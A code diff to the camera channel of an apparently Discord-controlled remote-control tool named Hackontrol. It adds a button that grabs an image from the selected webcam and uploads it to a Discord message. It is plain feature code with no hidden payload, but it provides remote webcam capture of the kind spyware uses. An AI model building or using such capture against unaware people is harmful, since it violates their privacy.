@@ -1,19 +1,26 @@
 package com.khopan.hackontrol.channel;
 
+import java.awt.image.BufferedImage;
+import java.util.ArrayList;
+import java.util.List;
+
 import com.khopan.hackontrol.CameraDevice;
 import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.NativeLibrary;
 import com.khopan.hackontrol.manager.button.ButtonContext;
 import com.khopan.hackontrol.manager.button.ButtonManager;
 import com.khopan.hackontrol.manager.common.sender.sendable.ISendable;
+import com.khopan.hackontrol.manager.common.sender.sendable.MessageCreateDataSendableListener;
 import com.khopan.hackontrol.manager.modal.ModalContext;
 import com.khopan.hackontrol.manager.modal.ModalManager;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolButton;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
+import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
 
 import net.dv8tion.jda.api.interactions.components.ActionRow;
+import net.dv8tion.jda.api.interactions.components.ItemComponent;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 import net.dv8tion.jda.api.interactions.components.text.TextInput;
@@ -27,6 +34,7 @@ public class CameraChannel extends HackontrolChannel {
 
 	private static final Button BUTTON_CAMERA_LIST = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Camera List", "cameraList");
 	private static final Button BUTTON_SELECT = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Select", "selectCamera");
+	private static final Button BUTTON_CAPTURE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Capture", "cameraCapture");
 	private static final Button BUTTON_REFRESH = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Refresh", "refreshCameraList");
 
 	private static final String MODAL_SELECT_CAMERA = "selectCamera";
@@ -44,6 +52,7 @@ public class CameraChannel extends HackontrolChannel {
 	public void preInitialize(Registry registry) {
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, CameraChannel.BUTTON_CAMERA_LIST, this :: buttonCameraList);
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, CameraChannel.BUTTON_SELECT, this :: buttonSelect);
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, CameraChannel.BUTTON_CAPTURE, this :: buttonCapture);
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, CameraChannel.BUTTON_REFRESH, this :: buttonRefresh);
 		registry.register(ModalManager.MODAL_REGISTRY, CameraChannel.MODAL_SELECT_CAMERA, this :: modalSelectCamera);
 	}
@@ -101,6 +110,26 @@ public class CameraChannel extends HackontrolChannel {
 		context.replyModal(modal).queue();
 	}
 
+	private void buttonCapture(ButtonContext context) {
+		if(this.selectedCamera == null) {
+			HackontrolMessage.deletable(context.reply(), "**No camera selected**");
+			return;
+		}
+
+
+		TimeSafeReplyHandler.start(context, consumer -> {
+			try {
+				BufferedImage image = this.selectedCamera.capture();
+				MessageCreateBuilder builder = new MessageCreateBuilder();
+				builder.setFiles(ScreenshotChannel.uploadImage(image, "capture"));
+				builder.addActionRow(CameraChannel.BUTTON_CAPTURE, HackontrolButton.delete());
+				consumer.accept(builder.build());
+			} catch(Throwable Errors) {
+				HackontrolError.throwable(MessageCreateDataSendableListener.of(consumer), Errors);
+			}
+		});
+	}
+
 	private void buttonRefresh(ButtonContext context) {
 		this.buttonCameraList(context);
 		HackontrolMessage.delete(context);
@@ -141,6 +170,7 @@ public class CameraChannel extends HackontrolChannel {
 		}
 
 		StringBuilder builder = new StringBuilder();
+		boolean hasSelected = false;
 
 		for(int i = 0; i < this.devices.length; i++) {
 			if(i > 0) {
@@ -168,8 +198,21 @@ public class CameraChannel extends HackontrolChannel {
 			if(selected) {
 				builder.append("**");
 			}
+
+			if(selected) {
+				hasSelected = true;
+			}
 		}
 
-		sender.send(new MessageCreateBuilder().setContent(builder.toString()).addActionRow(CameraChannel.BUTTON_SELECT, CameraChannel.BUTTON_REFRESH, HackontrolButton.delete()).build(), ButtonManager :: dynamicButtonCallback);
+		List<ItemComponent> list = new ArrayList<>();
+		list.add(CameraChannel.BUTTON_SELECT);
+		list.add(CameraChannel.BUTTON_REFRESH);
+
+		if(hasSelected) {
+			list.add(CameraChannel.BUTTON_CAPTURE);
+		}
+
+		list.add(HackontrolButton.delete());
+		sender.send(new MessageCreateBuilder().setContent(builder.toString()).addActionRow(list).build(), ButtonManager :: dynamicButtonCallback);
 	}
 }
